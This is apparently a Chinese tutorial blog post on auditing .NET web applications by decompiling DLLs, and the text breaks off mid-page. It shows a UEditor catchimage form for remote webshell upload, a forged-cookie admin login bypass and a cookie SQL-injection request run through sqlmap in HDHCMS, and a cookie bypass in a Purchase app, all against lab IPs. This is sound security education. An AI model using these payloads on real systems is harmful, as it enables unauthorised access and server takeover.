id="Inherits、CodeFile、CodeBehind"><a href="#Inherits、CodeFile、CodeBehind" class="headerlink" title="Inherits、CodeFile、CodeBehind"></a>Inherits、CodeFile、CodeBehind</h4><h4 id="指向解析："><a href="#指向解析：" class="headerlink" title="指向解析："></a>指向解析：</h4><h4 id="Inherits"><a href="#Inherits" class="headerlink" title="Inherits"></a>Inherits</h4><p>msdn解释：定义供页继承的代码隐藏类。 它可以是从 Page 类派生的任何类。 此特性与 CodeFile 特性一起使用，后者包含指向代码隐藏类的源文件的路径。 Inherits 特性在使用 C# 作为页面语言时区分大小写，而在使用 Visual Basic 作为页面语言时不区分大小写。</p><h4 id="CodeFile"><a href="#CodeFile" class="headerlink" title="CodeFile"></a>CodeFile</h4><p>msdn解释：指定指向页引用的代码隐藏文件的路径。 此特性与 Inherits 特性一起使用，用于将代码隐藏源文件与网页相关联。 此特性仅对编译的页有效。</p><h4 id="Codebehind"><a href="#Codebehind" class="headerlink" title="Codebehind"></a>Codebehind</h4><p>msdn解释：指定包含与页关联的类的已编译文件的名称。 该特性不能在运行时使用。此特性用于 Web 应用程序项目。</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-功能点追踪-Ueditor-编辑器文件上传"><a href="#➢-功能点追踪-Ueditor-编辑器文件上传" class="headerlink" title="➢ 功能点追踪-Ueditor-编辑器文件上传"></a>➢ 功能点追踪-Ueditor-编辑器文件上传</h4><h4 id="➢-功能点追踪-HDHCMS-脆弱验证-amp-SQL注入"><a href="#➢-功能点追踪-HDHCMS-脆弱验证-amp-SQL注入" class="headerlink" title="➢ 功能点追踪-HDHCMS-脆弱验证&amp;SQL注入"></a>➢ 功能点追踪-HDHCMS-脆弱验证&amp;SQL注入</h4><h4 id="➢-功能点追踪-Purchase-脆弱验证-amp-验证未引用"><a href="#➢-功能点追踪-Purchase-脆弱验证-amp-验证未引用" class="headerlink" title="➢ 功能点追踪-Purchase-脆弱验证&amp;验证未引用"></a>➢ 功能点追踪-Purchase-脆弱验证&amp;验证未引用</h4></blockquote><h4 id="功能点追踪-Ueditor-编辑器文件上传"><a href="#功能点追踪-Ueditor-编辑器文件上传" class="headerlink" title="#功能点追踪-Ueditor-编辑器文件上传"></a>#功能点追踪-Ueditor-编辑器文件上传</h4><blockquote><p>抓包-&gt;controller.ashx-&gt;有过滤-&gt;catchimage-&gt;CrawlerHandler-&gt;Crawler-&gt;远程接受抓取</p></blockquote><h6 id="上传构造："><a href="#上传构造：" class="headerlink" title="上传构造："></a>上传构造：</h6><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.46.139/net/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span>&lt;/p &gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="一个编辑器"><a href="#一个编辑器" class="headerlink" title="一个编辑器"></a>一个编辑器</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411005951818.png" alt="image-20230411005951818"></p><h6 id="上传文件抓包查看到它的文件路径"><a href="#上传文件抓包查看到它的文件路径" class="headerlink" title="上传文件抓包查看到它的文件路径"></a>上传文件抓包查看到它的文件路径</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411010133432.png" alt="image-20230411010133432"></p><h6 id="按照路径找到文件上传功能点的相应核心代码"><a href="#按照路径找到文件上传功能点的相应核心代码" class="headerlink" title="按照路径找到文件上传功能点的相应核心代码"></a>按照路径找到文件上传功能点的相应核心代码</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411010355421.png" alt="image-20230411010355421"></p><h6 id="这里都是从Config里面获取"><a href="#这里都是从Config里面获取" class="headerlink" title="这里都是从Config里面获取"></a>这里都是从Config里面获取</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411010653085.png" alt="image-20230411010653085"></p><h6 id="config在代码这个里面引用"><a href="#config在代码这个里面引用" class="headerlink" title="config在代码这个里面引用"></a>config在代码这个里面引用</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411010817136.png" alt="image-20230411010817136"></p><h6 id="找到这个dll反编译"><a href="#找到这个dll反编译" class="headerlink" title="找到这个dll反编译"></a>找到这个dll反编译</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411010923373.png" alt="image-20230411010923373"></p><h6 id="发现上面的一些名称都是来自这里，并且有过滤规则"><a href="#发现上面的一些名称都是来自这里，并且有过滤规则" class="headerlink" title="发现上面的一些名称都是来自这里，并且有过滤规则"></a>发现上面的一些名称都是来自这里，并且有过滤规则</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411011105608.png" alt="image-20230411011105608"></p><h6 id="发现上面的case值里面前面几个全部有类似上面的过滤，如：找到第一个没有的"><a href="#发现上面的case值里面前面几个全部有类似上面的过滤，如：找到第一个没有的" class="headerlink" title="发现上面的case值里面前面几个全部有类似上面的过滤，如：找到第一个没有的"></a>发现上面的case值里面前面几个全部有类似上面的过滤，如：找到第一个没有的<img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411011630611.png" alt="image-20230411011630611"></h6><h6 id="但是并不是文件上传的，而是展示文件的函数，对应处如下listimage"><a href="#但是并不是文件上传的，而是展示文件的函数，对应处如下listimage" class="headerlink" title="但是并不是文件上传的，而是展示文件的函数，对应处如下listimage"></a>但是并不是文件上传的，而是展示文件的函数，对应处如下listimage</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411011539752.png" alt="image-20230411011539752"></p><h6 id="list都是列出文件，可以看到第三个，catchimage，跟踪一下，发现可能是实现远程下载图片的功能"><a href="#list都是列出文件，可以看到第三个，catchimage，跟踪一下，发现可能是实现远程下载图片的功能" class="headerlink" title="list都是列出文件，可以看到第三个，catchimage，跟踪一下，发现可能是实现远程下载图片的功能"></a>list都是列出文件，可以看到第三个，catchimage，跟踪一下，发现可能是实现远程下载图片的功能</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411012038334.png" alt="image-20230411012038334"></p><h6 id="这里是远程调用它自己的服务器接收去抓取，而不是我们上传一个文件让它抓，控制权在它那里，无法修改，数据包修改了文件后缀也没有用，有mime验证，因为它只接收图片后缀，所以只能是图片，这里采取构造表单，绕过了mime验证，用-aspx绕过，远程抓的是jpg格式，因为命名是无法用”-“的，所以保存的时候会保存成aspx"><a href="#这里是远程调用它自己的服务器接收去抓取，而不是我们上传一个文件让它抓，控制权在它那里，无法修改，数据包修改了文件后缀也没有用，有mime验证，因为它只接收图片后缀，所以只能是图片，这里采取构造表单，绕过了mime验证，用-aspx绕过，远程抓的是jpg格式，因为命名是无法用”-“的，所以保存的时候会保存成aspx" class="headerlink" title="这里是远程调用它自己的服务器接收去抓取，而不是我们上传一个文件让它抓，控制权在它那里，无法修改，数据包修改了文件后缀也没有用，有mime验证，因为它只接收图片后缀，所以只能是图片，这里采取构造表单，绕过了mime验证，用?.aspx绕过，远程抓的是jpg格式，因为命名是无法用”?“的，所以保存的时候会保存成aspx"></a>这里是远程调用它自己的服务器接收去抓取，而不是我们上传一个文件让它抓，控制权在它那里，无法修改，数据包修改了文件后缀也没有用，有mime验证，因为它只接收图片后缀，所以只能是图片，这里采取构造表单，绕过了mime验证，用?.aspx绕过，远程抓的是jpg格式，因为命名是无法用”?“的，所以保存的时候会保存成aspx</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411013652372.png" alt="image-20230411013652372"></p><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411013927026.png" alt="image-20230411013927026"></p><h4 id="功能点追踪-HDHCMS-脆弱验证-amp-SQL注入"><a href="#功能点追踪-HDHCMS-脆弱验证-amp-SQL注入" class="headerlink" title="#功能点追踪-HDHCMS-脆弱验证&amp;SQL注入"></a>#功能点追踪-HDHCMS-脆弱验证&amp;SQL注入</h4><h4 id="在web-config中有四种验证模式："><a href="#在web-config中有四种验证模式：" class="headerlink" title="#在web.config中有四种验证模式："></a>#在web.config中有四种验证模式：</h4><h5 id="方式-描述"><a href="#方式-描述" class="headerlink" title="方式     描述"></a>方式     描述</h5><p>window IIS验证，在内联网环境中非常有用</p><p>Passport  微软集中式身份验证，一次登录便可访问所有成员站点</p><p>Form 窗体验证，验证帐号&#x2F;密码，Web编程最佳最流行的验证方式</p><p>None 表示ASP.NET自己根本不执行身份验证，完全依赖IIS身份验证</p><p>如Forms：</p><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411014316065.png" alt="image-20230411014316065"></p><h5 id="挖掘指向："><a href="#挖掘指向：" class="headerlink" title="挖掘指向："></a>挖掘指向：</h5><h5 id="1、脆弱验证"><a href="#1、脆弱验证" class="headerlink" title="1、脆弱验证"></a>1、脆弱验证</h5><h6 id="查看-x2F-admin-x2F-login-aspx代码中的inherit参数找到对应的反编译源码部分是在admin-login中"><a href="#查看-x2F-admin-x2F-login-aspx代码中的inherit参数找到对应的反编译源码部分是在admin-login中" class="headerlink" title="查看&#x2F;admin&#x2F;login.aspx代码中的inherit参数找到对应的反编译源码部分是在admin_login中"></a>查看&#x2F;admin&#x2F;login.aspx代码中的inherit参数找到对应的反编译源码部分是在admin_login中</h6><h6 id="查看login-asp代码里面是否有越权"><a href="#查看login-asp代码里面是否有越权" class="headerlink" title="查看login.asp代码里面是否有越权"></a>查看login.asp代码里面是否有越权</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410222006297.png" alt="image-20230410222006297"></p><h6 id="找到对应的dll文件反编译"><a href="#找到对应的dll文件反编译" class="headerlink" title="找到对应的dll文件反编译"></a>找到对应的dll文件反编译</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410205633242.png" alt="image-20230410205633242"></p><h6 id="不满足this-DonforKenbest-x3D-outsite的时候会跳出指向HdhGetFun-FunAdminLoginTo"><a href="#不满足this-DonforKenbest-x3D-outsite的时候会跳出指向HdhGetFun-FunAdminLoginTo" class="headerlink" title="不满足this.DonforKenbest&#x3D;outsite的时候会跳出指向HdhGetFun.FunAdminLoginTo()"></a>不满足this.DonforKenbest&#x3D;outsite的时候会跳出指向HdhGetFun.FunAdminLoginTo()</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410224712287.png" alt="image-20230410224712287"></p><h6 id="所以尝试跳出哪个循环不执行，执行if外面的语句，跟踪下面这个函数"><a href="#所以尝试跳出哪个循环不执行，执行if外面的语句，跟踪下面这个函数" class="headerlink" title="所以尝试跳出哪个循环不执行，执行if外面的语句，跟踪下面这个函数"></a>所以尝试跳出哪个循环不执行，执行if外面的语句，跟踪下面这个函数</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411003537743.png" alt="image-20230411003537743"></p><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411003634006.png" alt="image-20230411003634006"></p><h6 id="DonforYhm获取cookie中的两个参数，然后拼接到一个sql语句中，执行该语句，如果返回值是大于0（也就是查询到了结果）就设置cookie值为接收到的参数并跳转到default-aspx"><a href="#DonforYhm获取cookie中的两个参数，然后拼接到一个sql语句中，执行该语句，如果返回值是大于0（也就是查询到了结果）就设置cookie值为接收到的参数并跳转到default-aspx" class="headerlink" title="DonforYhm获取cookie中的两个参数，然后拼接到一个sql语句中，执行该语句，如果返回值是大于0（也就是查询到了结果）就设置cookie值为接收到的参数并跳转到default.aspx"></a>DonforYhm获取cookie中的两个参数，然后拼接到一个sql语句中，执行该语句，如果返回值是大于0（也就是查询到了结果）就设置cookie值为接收到的参数并跳转到default.aspx</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411003814741.png" alt="image-20230411003814741"></p><h6 id="跟踪一下这个获取DonfoeYhm值的函数"><a href="#跟踪一下这个获取DonfoeYhm值的函数" class="headerlink" title="跟踪一下这个获取DonfoeYhm值的函数"></a>跟踪一下这个获取DonfoeYhm值的函数</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411003935065.png" alt="image-20230411003935065"></p><h6 id="显示如下规则"><a href="#显示如下规则" class="headerlink" title="显示如下规则"></a>显示如下规则</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411004829845.png" alt="image-20230411004829845"></p><h6 id="综上所述，将CookName和CookValue设置值"><a href="#综上所述，将CookName和CookValue设置值" class="headerlink" title="综上所述，将CookName和CookValue设置值"></a>综上所述，将CookName和CookValue设置值</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411004544255.png" alt="image-20230411004544255"></p><h6 id="那么就相当于"><a href="#那么就相当于" class="headerlink" title="那么就相当于"></a>那么就相当于</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411004706686.png" alt="image-20230411004706686"></p><h6 id="构造数据包尝试越权，成功登录admin"><a href="#构造数据包尝试越权，成功登录admin" class="headerlink" title="构造数据包尝试越权，成功登录admin"></a>构造数据包尝试越权，成功登录admin</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411005218276.png" alt="image-20230411005218276"></p><h5 id="2、SQL注入"><a href="#2、SQL注入" class="headerlink" title="2、SQL注入"></a>2、SQL注入</h5><h6 id="admin-x2F-login-aspx-gt-Admin-login类-gt-函数FunAdminLoginTo-gt-函数FunGetCookies-gt"><a href="#admin-x2F-login-aspx-gt-Admin-login类-gt-函数FunAdminLoginTo-gt-函数FunGetCookies-gt" class="headerlink" title="admin&#x2F;login.aspx-&gt;Admin_login类-&gt; 函数FunAdminLoginTo-&gt;函数FunGetCookies-&gt;"></a>admin&#x2F;login.aspx-&gt;Admin_login类-&gt; 函数FunAdminLoginTo-&gt;函数FunGetCookies-&gt;</h6><h6 id="参数名-AdminCook-AdminUser-gt-AdminCook-x3D-AdminUser-x3D-admin"><a href="#参数名-AdminCook-AdminUser-gt-AdminCook-x3D-AdminUser-x3D-admin" class="headerlink" title="参数名(AdminCook,AdminUser)-&gt;AdminCook&#x3D;AdminUser&#x3D;admin"></a>参数名(AdminCook,AdminUser)-&gt;AdminCook&#x3D;AdminUser&#x3D;admin</h6><h6 id="刚才的sql语句是没有任何过滤的"><a href="#刚才的sql语句是没有任何过滤的" class="headerlink" title="刚才的sql语句是没有任何过滤的"></a>刚才的sql语句是没有任何过滤的</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411005314557.png" alt="image-20230411005314557"></p><h6 id="那么可以在admin旁边加上-，让sqlmap跑一下（可以看到下面的漏洞总结数据包）"><a href="#那么可以在admin旁边加上-，让sqlmap跑一下（可以看到下面的漏洞总结数据包）" class="headerlink" title="那么可以在admin旁边加上*，让sqlmap跑一下（可以看到下面的漏洞总结数据包）"></a>那么可以在admin旁边加上*，让sqlmap跑一下（可以看到下面的漏洞总结数据包）</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411005433968.png" alt="image-20230411005433968"></p><h6 id="结果说明确实存在注入"><a href="#结果说明确实存在注入" class="headerlink" title="结果说明确实存在注入"></a>结果说明确实存在注入</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230411005539845.png" alt="image-20230411005539845"></p><h5 id="漏洞总结："><a href="#漏洞总结：" class="headerlink" title="漏洞总结："></a>漏洞总结：</h5><h5 id="1、它是根据从cookie中获取参数拼接到sql语句中，猜解到用户名即可登录后台"><a href="#1、它是根据从cookie中获取参数拼接到sql语句中，猜解到用户名即可登录后台" class="headerlink" title="1、它是根据从cookie中获取参数拼接到sql语句中，猜解到用户名即可登录后台"></a>1、它是根据从cookie中获取参数拼接到sql语句中，猜解到用户名即可登录后台</h5><h5 id="2、扩展思考，既然是直接拼接sql语句，那么是否会在cookie这位置造成cookie注入呢？"><a href="#2、扩展思考，既然是直接拼接sql语句，那么是否会在cookie这位置造成cookie注入呢？" class="headerlink" title="2、扩展思考，既然是直接拼接sql语句，那么是否会在cookie这位置造成cookie注入呢？"></a>2、扩展思考，既然是直接拼接sql语句，那么是否会在cookie这位置造成cookie注入呢？</h5><p>pythhon sqlmap.py -r hdhcms.txt</p><blockquote><p>GET &#x2F;admin&#x2F;hdhadmin.aspx HTTP&#x2F;1.1</p><p>Host: 192.168.46.162:94</p><p>Upgrade-Insecure-Requests: 1</p><p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36 SE 2.X MetaSr 1.0</p><p>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</p><p>Referer: <a href="http://192.168.46.162:94/admin/">http://192.168.46.162:94/admin/</a></p><p>Accept-Encoding: gzip, deflate</p><p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p><p>Cookie: admincook&#x3D;adminuser&#x3D;admin’ and exists(select * from sysobje8cts)–; ASP.NET_SessionId&#x3D;ghvgk0ggktid45xwe1jy1tip</p><p>Connection: close</p></blockquote><h4 id="功能点追踪-Purchase-脆弱验证-amp-验证未引用"><a href="#功能点追踪-Purchase-脆弱验证-amp-验证未引用" class="headerlink" title="#功能点追踪-Purchase-脆弱验证&amp;验证未引用"></a>#功能点追踪-Purchase-脆弱验证&amp;验证未引用</h4><h5 id="第一种：脆弱验证-cookie或session验证不规范"><a href="#第一种：脆弱验证-cookie或session验证不规范" class="headerlink" title="第一种：脆弱验证-cookie或session验证不规范"></a>第一种：脆弱验证-cookie或session验证不规范</h5><blockquote><p>Default.aspx登录进入文件发现验证调用purchase.Master，反编译dll查看pur方法</p><p>UserHelper.GetUserId&gt;0即可，跟踪UserHelper方法后接受cookie下 [“userinfo”][“userid”]</p><p>Default.aspx-&gt;purchase.Master-&gt;Purchase.Purchase.pur-&gt;UserHelper.GetUserId</p><p>-&gt; Request.Cookies[“userinfo”]-&gt;userinfo&#x3D;userid&#x3D;1</p></blockquote><h6 id="尝试看能不能不登录访问登录后的页面"><a href="#尝试看能不能不登录访问登录后的页面" class="headerlink" title="尝试看能不能不登录访问登录后的页面"></a>尝试看能不能不登录访问登录后的页面</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410151447007.png" alt="image-20230410151447007"></p><h6 id="pd-aspx文件的核心内容路径，其他的内容都是html内容不用看"><a href="#pd-aspx文件的核心内容路径，其他的内容都是html内容不用看" class="headerlink" title="pd.aspx文件的核心内容路径，其他的内容都是html内容不用看"></a>pd.aspx文件的核心内容路径，其他的内容都是html内容不用看</h6><p><img 